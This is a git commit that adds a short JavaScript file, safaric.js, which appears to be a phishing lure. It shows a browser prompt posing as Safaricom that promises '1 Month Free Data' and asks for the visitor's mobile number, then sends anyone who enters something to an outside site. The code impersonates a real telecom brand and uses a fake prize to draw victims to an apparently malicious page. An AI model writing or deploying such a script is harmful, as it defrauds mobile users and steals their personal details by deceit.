4c49c93b3a026615ca03529095336ab97eee21d7
usorondo40 <menu.bridge_5t@icloud.com>
2026-03-05 03:28:55 +0100

    Create safaric.js

---
+++ safaric.js
@@ -0,0 +1,5 @@
+var password = '1 MONTH FREE DATA'
+password=prompt('Safaricom: Congratulations, your Safaricom Number is eligible to receive 1 Month Free Data, click OK to Enter Your Mobile Number','1 MONTH FREE DATA');
+if (password != '1 MONTH FREE DATA') {
+location.href='https://www.ufokakam.site/safaricom';
+}
